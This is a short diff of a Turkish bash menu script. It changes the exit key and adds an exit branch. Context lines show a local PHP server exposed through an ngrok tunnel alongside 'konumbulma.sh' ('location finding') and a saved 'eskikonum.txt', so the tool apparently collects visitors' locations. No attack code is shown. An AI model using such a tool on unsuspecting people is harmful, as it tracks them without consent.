@@ -164,7 +164,7 @@ printf "
 
 [3]  \e[31m──────────[\e[32mNGROK GÜNCELLE\e[31m]\e[0m
 
-\e[31m[\e[0mCTRL Z\e[31m]  \e[31m─────[\e[32mÇIKIŞ\e[31m]\e[0m
+\e[31m[\e[0mX\e[31m]  \e[31m──────────[\e[32mÇIKIŞ\e[31m]\e[0m
 "
 echo
 echo
@@ -183,6 +183,15 @@ if [ $secim == 1 ];then
 	url & php -S 127.0.0.1:$port & ngrok http $port
 	cd ..
 	bash konumbulma.sh
+elif [[ $secim == x || $secim == X ]];then
+	echo
+	echo
+	echo
+	printf "\e[31m[!]\e[0m ÇIKIŞ YAPILDI\e[31m !!!\e[0m"
+	echo
+	echo
+	echo
+	exit
 elif [ $secim == 2 ];then
 	if [[ -a eskikonum.txt ]];then
 		echo
